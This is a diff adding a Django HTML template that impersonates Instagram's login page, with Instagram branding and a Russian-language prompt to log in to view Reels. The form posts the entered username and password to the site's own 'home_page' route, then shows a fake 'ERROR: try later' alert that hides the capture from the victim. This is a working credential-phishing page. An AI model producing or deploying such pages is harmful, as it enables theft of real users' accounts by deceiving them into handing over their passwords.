@@ -1,0 +1,44 @@
+{%load static%}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width,initial_scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="static/style.css" />
+    <link rel="stylesheet" href="static/media-queries.css" />
+    <link rel="icon" href="static/photos/insta-icon.jpg" />
+</head>
+<body>
+    <main>
+        <div class="log-in-container">
+            <div class="log-in">
+                <img src="static/photos/logo.png" class="logo"/>
+                <h1 style="font-size: 15px; margin-bottom: 10px;">Зайдите в аккаунт что бы увидеть Reels</h1>
+                <form method="post" action="{% url 'home_page' %}" class="log-in-form" onsubmit="showAlert()">
+                    {% csrf_token %}
+                    <input type="text" name="login" placeholder="Phone number, username or email" />
+                    <input type="password" name="password" placeholder="Password" />
+                    <button class="log-in-button" type="submit">Log In</button>
+                </form>
+
+            </div>
+           
+
+
+        </div>
+        <!--phones-->
+        <!-- <div class="phones-container">
+            <img src="photos/phones.png" />
+        </div> -->
+        <script>
+            function showAlert() {
+                alert("ERROR: Попробуйте позже");
+            }
+        </script>
+        
+    </main>
+</body>
+
+</html>
